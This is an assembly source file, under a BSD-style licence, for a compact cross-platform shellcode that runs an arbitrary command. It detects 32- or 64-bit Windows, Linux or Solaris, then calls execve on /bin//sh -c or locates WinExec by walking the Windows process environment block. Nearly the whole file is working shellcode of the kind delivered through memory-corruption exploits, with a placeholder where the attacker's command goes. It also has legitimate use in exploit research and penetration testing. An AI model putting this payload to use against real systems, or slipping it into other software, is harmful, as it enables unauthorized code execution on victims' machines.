;
;  Copyright © 2016 Odzhan.
;  Copyright © 2014 Peter Ferrie.
;
;  All Rights Reserved.
;
;  Redistribution and use in source and binary forms, with or without
;  modification, are permitted provided that the following conditions are
;  met:
;
;  1. Redistributions of source code must retain the above copyright
;  notice, this list of conditions and the following disclaimer.
;
;  2. Redistributions in binary form must reproduce the above copyright
;  notice, this list of conditions and the following disclaimer in the
;  documentation and/or other materials provided with the distribution.
;
;  3. The name of the author may not be used to endorse or promote products
;  derived from this software without specific prior written permission.
;
;  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
;  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
;  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
;  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
;  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
;  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
;  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
;  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
;  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
;  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
;  POSSIBILITY OF SUCH DAMAGE.
;
;  Execute a command
;  Works on 32/64-bit versions of Windows and Linux
;
;  yasm -fbin exec.asm -oexec.bin
;  nasm -fbin exec.asm -oexec.bin
;
;  194 bytes
;
    bits    32
    
    push    esi
    push    edi
    push    ebx
    push    ebp
    
    xor     ecx, ecx          ; ecx=0
    mul     ecx               ; eax=0, edx=0
    
    push    eax
    push    eax
    push    eax
    push    eax
    push    eax               ; setup homespace for win64
    jmp     l_sb              ; load command
    
get_os:
    pop     edi               ; edi=cmd, argv
    mov     cl, 7
    ; initialize cmd/argv regardless of OS
    push    eax               ; argv[3]=NULL;
    push    edi               ; argv[2]=cmd
    repnz   scasb             ; skip command line
    stosb                     ; zero terminate
    push    edi               ; argv[1]="-c", 0
    scasw                     ; skip option
    stosb                     ; zero terminate
    push    edi               ; argv[0]="/bin//sh", 0
    push    esp               ; save argv
    push    edi               ; save pointer to "/bin//sh", 0
    
    inc     ecx               ; ignored on x64
    jecxz   gos_x64           ; if ecx==0 we're 64-bit
    
    ; we're 32-bit
    ; if gs is zero, we're native 32-bit windows
    mov     cx, gs
    jecxz   win_cmd
    
    ; if eax is zero after right shift of SP, ASSUME we're on windows
    push    esp
    pop     eax
    shr     eax, 24
    jz      win_cmd
    
    ; we're 32-bit Linux
    mov     al, 11            ; eax=sys_execve
    cdq
    pop     ebx               ; ebx="/bin//sh", 0
    pop     ecx               ; ecx=argv
    
    push    edx               ; environment
    push    ecx               ; argv
    push    ebx               ; "/bin//sh", 0
    push    esp
    mov     di, gs
    shr     di, 8
    jnz     solaris_x86
    int     0x80
solaris_x86:
    int     0x91
    
    ; we're 64-bit, execute syscall and see what
    ; error returned
gos_x64:
    mov     al, 6            ; eax=sys_close for Linux/BSD
    push    -1
    pop     edi
    syscall
    cmp     al, 5            ; Windows 7
    je      win_cmd
    cmp     al, 8            ; Windows 10
    je      win_cmd
    
    push    59               ; sys_execve
    pop     eax
    cdq                      ; penv=0
    pop     edi              ; rdi="/bin//sh", 0
    pop     esi              ; rsi=argv
    syscall
l_sb:
    jmp     ld_cmd
    ; following code is derived from Peter Ferrie's calc shellcode
    ; i've modified it to execute commands
win_cmd:
    pop     eax               ; eax="/bin//sh", 0
    pop     eax               ; eax=argv
    pop     eax               ; eax="/bin//sh", 0
    pop     eax               ; eax="-c", 0
    pop     ecx               ; ecx=cmd
    pop     eax               ; eax=0
    
    inc     eax
    xchg    edx, eax
    jz      x64

    push    eax               ; will hide
    push    ecx               ; cmd
    
    mov     esi, [fs:edx+2fh]
    mov     esi, [esi+0ch]
    mov     esi, [esi+0ch]
    lodsd
    mov     esi, [eax]
    mov     edi, [esi+18h]
    mov     dl, 50h
    jmp     lqe
    bits 64
x64:
    mov     dl, 60h
    mov     rsi, [gs:rdx]
    mov     rsi, [rsi+18h]
    mov     rsi, [rsi+10h]
    lodsq
    mov     rsi, [rax]
    mov     rdi, [rsi+30h]
lqe:
    add     edx, [rdi+3ch]
    mov     ebx, [rdi+rdx+28h]
    mov     esi, [rdi+rbx+20h]
    add     rsi, rdi
    mov     edx, [rdi+rbx+24h]
fwe:
    movzx   ebp, word [rdi+rdx]
    lea     rdx, [rdx+2]
    lodsd
    cmp     dword [rdi+rax], 'WinE'
    jne     fwe
    
    mov     esi, [rdi+rbx+1ch]
    add     rsi, rdi
    
    mov     esi, [rsi+rbp*4]
    add     rdi, rsi
    cdq
    call    rdi
cmd_end:
    bits    32
    pop     eax
    pop     eax
    pop     eax
    pop     eax
    pop     eax
    pop     ebp
    pop     ebx
    pop     edi
    pop     esi
    ret
ld_cmd:
    call    get_os
    ; place command here
    ;db     "notepad", 0xFF
    ; do not change anything below  
    ;db      "-c", 0xFF, "/bin//sh", 0
    
